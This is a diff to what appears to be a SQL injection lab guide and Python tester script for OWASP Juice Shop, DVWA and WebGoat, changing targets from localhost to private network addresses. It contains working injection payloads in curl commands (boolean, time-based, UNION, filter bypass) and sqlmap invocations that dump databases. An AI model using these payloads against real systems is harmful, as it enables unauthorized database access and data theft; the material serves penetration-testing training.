@@ -28,27 +28,27 @@ git clone https://github.com/danielmiessler/SecLists.git ~/wordlists
 
 ```bash
 # Test for error-based SQL injection
-curl -X POST "http://localhost:3000/rest/user/login" \
+curl -X POST "http://10.30.0.237:3000/rest/user/login" \
   -H "Content-Type: application/json" \
   -d '{"email":"admin'\''","password":"password"}'
 
 # Boolean-based blind SQL injection test
-curl "http://localhost:3000/rest/products/search?q=apple' AND '1'='1"
-curl "http://localhost:3000/rest/products/search?q=apple' AND '1'='2"
+curl "http://10.30.0.237:3000/rest/products/search?q=apple' AND '1'='1"
+curl "http://10.30.0.237:3000/rest/products/search?q=apple' AND '1'='2"
 
 # Time-based blind SQL injection
-curl "http://localhost:3000/rest/products/search?q=apple'; WAITFOR DELAY '00:00:05'--"
+curl "http://10.30.0.237:3000/rest/products/search?q=apple'; WAITFOR DELAY '00:00:05'--"
 ```
 
 ### 2. DVWA SQL Injection Testing
 
 ```bash
 # Low security level
-curl "http://localhost/dvwa/vulnerabilities/sqli/?id=1' UNION SELECT 1,2--&Submit=Submit" \
+curl "http://10.30.0.235/dvwa/vulnerabilities/sqli/?id=1' UNION SELECT 1,2--&Submit=Submit" \
   --cookie "PHPSESSID=your_session; security=low"
 
 # Medium security level (bypass filtering)
-curl "http://localhost/dvwa/vulnerabilities/sqli/?id=1%20UNION%20SELECT%201,2--&Submit=Submit" \
+curl "http://10.30.0.235/dvwa/vulnerabilities/sqli/?id=1%20UNION%20SELECT%201,2--&Submit=Submit" \
   --cookie "PHPSESSID=your_session; security=medium"
 ```
 
@@ -56,18 +56,18 @@ curl "http://localhost/dvwa/vulnerabilities/sqli/?id=1%20UNION%20SELECT%201,2--&
 
 ```bash
 # OWASP Juice Shop login bypass
-sqlmap -u "http://localhost:3000/rest/user/login" \
+sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
   --data='{"email":"test","password":"test"}' \
   --headers="Content-Type: application/json" \
   --dbms=sqlite --technique=B --level=3 --risk=3
 
 # DVWA parameter testing
-sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+sqlmap -u "http://10.30.0.235/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
   --cookie="PHPSESSID=session_id; security=low" \
   --dbs --dump --batch
 
 # WebGoat SQL injection lesson
-sqlmap -u "http://localhost:8080/WebGoat/SqlInjection/attack5a" \
+sqlmap -u "http://10.30.0.237:8080/WebGoat/SqlInjection/attack5a" \
   --data="account=Smith&operator=and&injection=%27" \
   --technique=UB --level=5 --risk=3
 ```
@@ -111,7 +111,7 @@ class SQLInjectionTester:
         )
         self.logger = logging.getLogger(__name__)
 
-    def test_juice_shop_sql_injection(self, base_url="http://localhost:3000"):
+    def test_juice_shop_sql_injection(self, base_url="http://10.30.0.237:3000"):
         """Test SQL injection vulnerabilities in OWASP Juice Shop"""
         self.logger.info("Testing OWASP Juice Shop SQL injection vulnerabilities")
 
@@ -170,7 +170,7 @@ class SQLInjectionTester:
             except Exception as e:
                 self.logger.error(f"Error testing search: {e}")
 
-    def test_dvwa_sql_injection(self, base_url="http://localhost/dvwa", session_cookie=None):
+    def test_dvwa_sql_injection(self, base_url="http://10.30.0.235/dvwa", session_cookie=None):
         """Test SQL injection in DVWA"""
         self.logger.info("Testing DVWA SQL injection vulnerabilities")
 
@@ -477,20 +477,20 @@ def main():
     # tester.test_dvwa_sql_injection(session_cookie={"PHPSESSID": "your_session_id"})
 
     # Test blind SQL injection
-    tester.test_blind_sql_injection("http://localhost:3000/rest/products/search", "q")
+    tester.test_blind_sql_injection("http://10.30.0.237:3000/rest/products/search", "q")
 
     # Test time-based blind injection
-    tester.test_time_based_blind_injection("http://localhost:3000/rest/products/search", "q")
+    tester.test_time_based_blind_injection("http://10.30.0.237:3000/rest/products/search", "q")
 
     # SQLMap automation targets
     sqlmap_targets = [
         {
-            "url": "http://localhost:3000/rest/user/login",
+            "url": "http://10.30.0.237:3000/rest/user/login",
             "data": '{"email":"test","password":"test"}',
             "headers": {"Content-Type": "application/json"}
         },
         {
-            "url": "http://localhost:3000/rest/products/search?q=test"
+            "url": "http://10.30.0.237:3000/rest/products/search?q=test"
         }
     ]
 
